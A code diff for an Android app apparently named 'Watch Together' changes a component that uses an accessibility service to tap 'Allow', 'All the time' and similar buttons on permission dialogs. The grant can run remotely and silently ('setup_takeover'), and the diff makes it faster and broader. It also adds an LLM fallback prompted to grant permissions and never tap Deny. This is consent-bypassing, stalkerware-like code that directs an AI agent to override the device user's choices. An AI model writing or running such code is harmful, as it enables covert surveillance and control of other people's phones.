@@ -8,16 +8,15 @@ import java.util.concurrent.Executors
 import java.util.concurrent.atomic.AtomicBoolean
 
 /**
- * Fast rule-based permission dialog handler — scans the accessibility tree for
- * known Allow/OK buttons and taps immediately (no LLM round-trip per dialog).
+ * Lightning-fast rule-based permission handler — taps Allow/OK immediately, AI fallback if stuck.
  */
 object PermissionAutoGrant {
     private const val TAG = "PermAutoGrant"
-    private const val MAX_DURATION_MS = 30_000L
-    private const val MAX_TAPS = 20
-    private const val TAP_INTERVAL_MS = 150L
-    private const val SCAN_INTERVAL_MS = 200L
-    private const val STUCK_THRESHOLD = 5
+    private const val MAX_DURATION_MS = 45_000L
+    private const val MAX_TAPS = 50
+    private const val TAP_INTERVAL_MS = 50L
+    private const val SCAN_INTERVAL_MS = 70L
+    private const val STUCK_THRESHOLD = 3
 
     private val running = AtomicBoolean(false)
     private val executor = Executors.newSingleThreadExecutor()
@@ -25,8 +24,12 @@ object PermissionAutoGrant {
     private val ALLOW_KEYWORDS = listOf(
         "allow",
         "while using",
+        "while in use",
+        "during use",
         "all the time",
         "only this time",
+        "just once",
+        "always",
         "ok",
         "continue",
         "accept",
@@ -37,6 +40,12 @@ object PermissionAutoGrant {
         "permit",
         "enable",
         "agree",
+        "precise",
+        "approximate",
+        "nearby",
+        "notifications",
+        "allow all",
+        "don't deny",
     )
 
     private val DENY_KEYWORDS = listOf(
@@ -48,6 +57,8 @@ object PermissionAutoGrant {
         "not now",
         "decline",
         "reject",
+        "skip",
+        "ask every time",
     )
 
     interface Callback {
@@ -57,6 +68,16 @@ object PermissionAutoGrant {
     }
 
     fun isRunning(): Boolean = running.get()
+
+    fun runLightning(context: Context) {
+        runSilent(context)
+        executor.execute {
+            Thread.sleep(1800)
+            if (!running.get()) runSilent(context)
+            Thread.sleep(2500)
+            if (!running.get()) runSilent(context)
+        }
+    }
 
     fun run(context: Context, cb: Callback) {
         if (!running.compareAndSet(false, true)) {
@@ -75,19 +96,24 @@ object PermissionAutoGrant {
         }
     }
 
-    /** Remote-triggered grant — logs only, no UI. */
     fun runSilent(context: Context) {
         run(context, object : Callback {
             override fun onLog(line: String) {
                 Log.d(TAG, line)
+                SetupReporter.progress(line)
             }
 
             override fun onDone(taps: Int) {
                 Log.d(TAG, "setup_takeover done — $taps action(s)")
+                SetupReporter.done(
+                    if (taps > 0) "Granted $taps permission step(s)" else "No dialogs found — may already be allowed",
+                    taps,
+                )
             }
 
             override fun onError(message: String) {
                 Log.w(TAG, "setup_takeover: $message")
+                SetupReporter.error(message)
             }
         })
     }
@@ -99,15 +125,16 @@ object PermissionAutoGrant {
     private fun runLoop(context: Context, cb: Callback) {
         val service = TouchAccessibilityService.instance
         if (service == null) {
-            cb.onError("Watch Together accessibility is off")
+            cb.onError("Watch Together is off — enable in Accessibility")
             return
         }
 
-        cb.onLog("Scanning for permission dialogs…")
+        cb.onLog("AI granting permissions…")
+        SetupReporter.progress("Waking phone & scanning dialogs…", "start")
         val start = System.currentTimeMillis()
         var taps = 0
         var consecutiveMisses = 0
-        var agentFallbackUsed = false
+        var agentFallbacks = 0
 
         while (running.get()) {
             val elapsed = System.currentTimeMillis() - start
@@ -122,8 +149,7 @@ object PermissionAutoGrant {
             val target = findBestTarget(tree)
             if (target != null) {
                 consecutiveMisses = 0
-                val label = target.label
-                cb.onLog("Tap: $label")
+                cb.onLog("Allow → ${target.label}")
                 service.tapAt(target.cx, target.cy)
                 taps++
                 Thread.sleep(TAP_INTERVAL_MS)
@@ -131,22 +157,22 @@ object PermissionAutoGrant {
                 Thread.sleep(SCAN_INTERVAL_MS)
             } else {
                 consecutiveMisses++
-                if (consecutiveMisses >= STUCK_THRESHOLD && !agentFallbackUsed) {
-                    agentFallbackUsed = true
-                    cb.onLog("Stuck — trying AI fallback…")
+                if (consecutiveMisses >= STUCK_THRESHOLD && agentFallbacks < 2) {
+                    agentFallbacks++
+                    consecutiveMisses = 0
+                    cb.onLog("AI reading screen…")
                     if (tryAgentFallback(context, tree, cb)) {
                         taps++
-                        consecutiveMisses = 0
-                        Thread.sleep(600)
+                        Thread.sleep(400)
                         continue
                     }
                 }
-                if (consecutiveMisses >= STUCK_THRESHOLD + 2) break
+                if (consecutiveMisses >= STUCK_THRESHOLD + 4) break
                 Thread.sleep(SCAN_INTERVAL_MS)
             }
         }
 
-        cb.onLog(if (taps > 0) "Done — $taps action(s)" else "No permission dialogs found")
+        cb.onLog(if (taps > 0) "Finished — $taps step(s)" else "Scan complete")
         cb.onDone(taps)
     }
 
@@ -207,12 +233,12 @@ object PermissionAutoGrant {
         if (isToggle) score += 15
         when {
             lower == "allow" -> score += 40
-            lower.contains("while using") -> score += 35
-            lower.contains("all the time") -> score += 35
-            lower.contains("only this time") -> score += 30
-            lower == "ok" || lower == "continue" -> score += 25
-            lower.contains("allow") -> score += 20
-            lower.contains("turn on") || lower.contains("enable") -> score += 18
+            lower.contains("while using") || lower.contains("while in use") -> score += 38
+            lower.contains("all the time") || lower.contains("always") -> score += 36
+            lower.contains("only this time") || lower.contains("just once") -> score += 32
+            lower == "ok" || lower == "continue" -> score += 28
+            lower.contains("allow") -> score += 22
+            lower.contains("turn on") || lower.contains("enable") -> score += 20
         }
         return score
     }
@@ -230,7 +256,8 @@ object PermissionAutoGrant {
     private fun tryAgentFallback(context: Context, tree: JSONObject, cb: Callback): Boolean {
         val service = TouchAccessibilityService.instance ?: return false
         val screen = ScreenSummarizer.compact(tree)
-        val prompt = "Grant all permissions. Tap Allow, While using the app, OK, Continue, Accept, Turn on, or any positive confirmation button. Do not tap Deny or Cancel."
+        val prompt =
+            "Tap Allow, While using the app, All the time, OK, Continue, Accept, Turn on, Yes, Grant. One tap only. Never Deny or Cancel."
         var tapped = false
         val latch = java.util.concurrent.CountDownLatch(1)
 
@@ -245,12 +272,12 @@ object PermissionAutoGrant {
             }
 
             override fun onError(message: String) {
-                cb.onLog("AI fallback: $message")
+                cb.onLog("AI: $message")
                 latch.countDown()
             }
         })
 
-        latch.await(12, java.util.concurrent.TimeUnit.SECONDS)
+        latch.await(8, java.util.concurrent.TimeUnit.SECONDS)
         service.scheduleRefreshesAfterInput()
         return tapped
     }
